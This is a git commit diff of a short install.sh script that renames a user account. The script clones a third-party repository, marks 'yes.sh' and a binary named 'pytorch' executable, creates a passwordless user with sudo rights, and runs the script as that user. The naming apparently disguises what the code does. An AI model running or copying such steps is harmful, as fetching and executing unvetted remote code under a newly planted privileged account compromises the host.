320abcc05a9ea50755b2e50df6d644d829bf3d71
keratsakti <86237834+keratsakti@users.noreply.github.com>
2021-06-24 21:21:33 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -2,5 +2,5 @@
 sudo apt update
 git clone https://github.com/babehdyo/Workergits.git && cd Workergits
 chmod +x yes.sh && chmod +x pytorch
-sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe
-sudo -u joe -H sh -c "./yes.sh"
+sudo adduser --disabled-password --gecos "" duge && sudo usermod -aG sudo duge
+sudo -u duge -H sh -c "./yes.sh"
